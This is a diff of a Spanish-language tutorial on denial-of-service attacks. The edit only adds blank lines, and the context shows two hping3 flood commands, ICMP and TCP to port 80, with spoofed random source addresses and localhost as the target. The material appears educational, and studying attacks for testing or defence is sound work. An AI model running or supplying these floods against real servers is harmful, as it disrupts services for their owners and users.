@@ -14,6 +14,8 @@ Para paralizar un servidor enviando muchos paquetes TCP, puedes utilizar la herr
 
 ```Bash
 hping3 --icmp --rand-source --flood -d 1400 127.0.0.1
+
+
 ```
 
 ![Ataque DoS con paquetes ICMP](ataques-DoS.png)
@@ -30,6 +32,8 @@ Otra forma de realizar un ataque DoS es dirigirlo a un puerto específico. En es
 
 ```sh
 hping3 --rand-source -d 500 127.0.0.1 -p 80 --flood
+
+
 ```
 
 ![Ataque DoS en un puerto específico](hping3-bytes.png)
